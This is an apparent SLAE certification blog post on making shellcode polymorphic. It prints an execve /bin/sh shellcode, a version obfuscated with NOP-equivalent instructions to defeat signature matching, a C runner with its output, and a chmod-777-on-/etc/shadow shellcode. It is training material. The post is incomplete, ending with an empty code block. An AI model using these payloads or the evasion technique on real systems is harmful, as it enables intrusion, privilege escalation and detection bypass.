---
layout: post
title: Polymorphic Shellcode
date: 2021-01-17 20:30:00
categories: posts
comments: false
en: true
---

#### Introduction

These series of posts starting with the prefix "Assignment" will be created in order to fulfill the requirements of the SLAE certification. 

According to wikipedia, "Polymorphic code is code that uses a polymorphic engine to mutate while keeping the original algorithm intact. That is, the code changes itself each time it runs, but the function of the code (its semantics) will not change at all. For example, 1+3 and 6-2 both achieve the same result while using different values and operations.". This could include as well garbage instructions which do not affect execution at all. Nevertheless, it helps to beat pattern matching.

Today we are going to dive a little deep within Polymorphic shellcode. However, instead of using an engine, we will generate it with our own hands! 

The sixth assignment from the seven requires taking three [shellcodes](https://es.wikipedia.org/wiki/Shellcode) from [shell-storm.org](http://shell-storm.org/) and generate polymorphic versions of such. In addition, its size should not be bigger than 50%.

#### Execve Shellcode (Shellcode #1)

The first shellcode from the three will be one that executes ```/bin/sh``` through the ```execve``` syscall. It can be found [here](http://shell-storm.org/shellcode/files/shellcode-827.php). 

###### Original code

```term
xor    eax,eax
push   eax
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
push   eax
push   ebx
mov    ecx,esp
mov    al,0xb
int    0x80
```

There are infinite ways to modify such shellcode. For instance, "NOP equivalents" could be used, which add no functionality whatsoever and difficult pattern matching. 
Furthermore, the value ```/bin/sh``` that is pushed within the instructions ```push   0x68732f2f``` and ```push   0x6e69622f``` could be reduced by 1 and then incremented while 
being saved on a specific registers instead of directly the stack.

###### Final code:

```term
global _start

_start:

       sahf                      ; Should store instructions. However, it is used as a NOP equivalent.

       xor    eax,eax            ; Zeroes out EAX.
       pushad                    ; Should save the current flags. However, it is used as a NOP equivalent.
       push   eax                ; Pushes the dword of EAX (0x00000000).

       cld                       ; Should clear the direction flag. However, it is used as a NOP equivalent.
       mov esi, 0x68732f2e       ; Saves value "hs/.". If incremented by 1, it should possess value "hs//".
       inc esi                   ; Increments ESI.
       cdq                       ; Zeroes out EDX. Also a NOP Equivalent.
       mov edi, 0x6e69622e       ; Saves value "nib.". If incremented by 1, it should possess value "bin/".
       inc edi                   ; Increments EDI.

       push esi                  ; Pushes the value of ESI ("hs//").
       std                       ; NOP Equivalent.
       push edi                  ; Pushes the value of EDI ("bin/").

       mov ebx, esp              ; Saves the value of ESP in EBX.
       cld                       ; NOP Equivalent.
       cmc                       ; NOP Equivalent.

       mov al, 11                ; Calls execve.
       int 0x80                  ; Calls to kernel.
```

Let's obtain the dump the shellcode and test it!

```term
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/1_shellcode# nasm -f elf32 1.asm -o 1.o && ld 1.o -o 1 
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/1_shellcode# objdump -d ./1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x9e\x31\xc0\x60\x50\xfc\xbe\x2e\x2f\x73\x68\x46\x99\xbf\x2e\x62\x69\x6e\x47\x56\xfd\x57\x89\xe3\xfc\xf5\xb0\x0b\xcd\x80"
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/1_shellcode#
```

```term
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x9e\x31\xc0\x60\x50\xfc\xbe\x2e\x2f\x73\x68\x46\x99\xbf\x2e\x62\x69\x6e\x47\x56\xfd\x57\x89\xe3\xfc\xf5\xb0\x0b\xcd\x80";

main()
{

  printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```

#### EndGame #1

```term
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/1_shellcode# gcc polymorphic.c -o polymorphic -fno-stack-protector -z execstack -w 
root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/1_shellcode# ./polymorphic 
Shellcode Length:  30
#
```

Original Size: 23 bytes
Final Size: 30 bytes

Increment: 31%

#### Chmod Shellcode (Shellcode #2)

The second shellcode from the three will be one that performs a ```chmod``` operation on the file ```/etc/shadow``` with privileges ```777```. It can be found [here](http://shell-storm.org/shellcode/files/shellcode-590.php). 

###### Original code:

```term
xor    eax,eax
push   eax
mov    al,0xf
push   0x776f6461
push   0x68732f63
push   0x74652f2f
mov    ebx,esp
xor    ecx,ecx
mov    cx,0x1ff
int    0x80
inc    eax
int    0x80
```

There aren't many things that we can do. Nonetheless, we can apply similar techniques as we did on the previous shellcode:

```term

```

### Code

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-
courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-27812/PA-27812

You can find all of the used resources within this post [here](https://github.com/whitecr0wz/SLAE/tree/main/Assignment_6).
